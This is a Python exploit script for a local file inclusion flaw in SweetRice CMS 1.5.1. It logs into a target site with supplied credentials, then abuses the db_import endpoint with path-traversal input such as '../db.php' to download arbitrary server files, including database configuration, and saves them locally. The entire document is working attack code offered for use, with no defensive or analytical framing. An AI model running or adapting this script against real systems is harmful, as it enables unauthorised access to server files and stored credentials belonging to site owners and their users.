#-*- Coding: utf-8 -*-
# Exploit Title: SweetRice 1.5.1 - Local File Inclusion
# Exploit Author: Ashiyane Digital Security Team
# Date: 03-11-2016
# Vendor: http://www.basic-cms.org/
# Software Link: http://www.basic-cms.org/attachment/sweetrice-1.5.1.zip
# Version: 1.5.1
# Platform: WebApp - PHP - Mysql
 
import requests
import os
from requests import session
 
if os.name == &#039;nt&#039;:
    os.system(&#039;cls&#039;)
else:
    os.system(&#039;clear&#039;)
    pass
banner = &#039;&#039;&#039;
+-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-+
|  _________                      __ __________.__                    |
| /   _____/_  _  __ ____   _____/  |\______   \__| ____  ____      |
| \_____  \\ \/ \/ // __ \_/ __ \   __\       _/  |/ ___\/ __ \     |
| /        \\     /\  ___/\  ___/|  | |    |   \  \  \__\  ___/     |
|/_______  / \/\_/  \___  >\___  >__| |____|_  /__|\___  >___  >    |
|        \/             \/     \/            \/        \/    \/     |                                                    
|    > SweetRice 1.5.1 Local File Inclusion                            |
|    > Script Cod3r : Ehsan Hosseini                                    |
+-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-+
&#039;&#039;&#039;
 
print(banner)
 
 
# Get Host & User & Pass & LfiPath
host = input("Enter The Target URL(Example : localhost.com) : ")
username = input("Enter Username : ")
password = input("Enter Password : ")
lfipath = input("Enter File To Download(Example : ../db.php) : ")
xplfile = input("Enter Name of File To Save(Example : ../db.php) : ")
 
userinfo = {
    &#039;user&#039;:username,
    &#039;passwd&#039;:password,
    &#039;rememberMe&#039;:&#039;&#039;
}
 
with session() as r:
    login = r.post(&#039;http://&#039; + host + &#039;/as/?type=signin&#039;, data=userinfo)
    success = &#039;Login success&#039;
    if login.status_code == 200:
        print("[+] Sending User&Pass...")
        if login.text.find(success) > 1:
            print("[+] Login Succssfully...")
        else:
            print("[-] User or Pass is incorrent...")
            print("Good Bye...")
            exit()
            pass
        pass
    dlfile = r.get(&#039;http://&#039; + host + &#039;/as/?type=data&mode=db_import&db_file=&#039; + lfipath + &#039;&form_mode=save&#039;)
 
    if dlfile.status_code == 200:
 
        print(&#039;[+] Exploit...&#039;)
        file = open(xplfile, "w")
        file.write(dlfile.text)
        file.close()
        print(&#039;[+] File Saved...&#039;)
        print(&#039;[+] Exploit By Ehsan Hosseini&#039;)
    else:
        print("[-] Error in Exploting...")
        pass

